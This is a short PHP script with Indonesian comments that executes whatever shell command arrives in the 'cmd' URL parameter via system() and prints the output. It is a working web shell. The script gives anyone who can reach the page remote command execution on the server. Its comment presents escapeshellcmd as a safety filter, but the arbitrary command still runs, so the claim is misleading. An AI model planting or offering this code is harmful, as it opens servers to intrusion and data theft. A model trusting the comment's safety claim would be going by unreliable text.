<?php
// Cek apakah parameter 'cmd' ada di URL
if (isset($_GET['cmd'])) {
    // Ambil nilai parameter 'cmd' dari URL
    $command = $_GET['cmd'];

    // Filter input untuk mencegah perintah berbahaya (opsional, untuk keamanan)
    $safeCommand = escapeshellcmd($command);

    // Tampilkan dan jalankan perintah menggunakan system()
    echo "<pre>";
    system($safeCommand, $output);
    echo "</pre>";
} else {
    echo "Parameter 'cmd' tidak ditemukan.";
}
?>
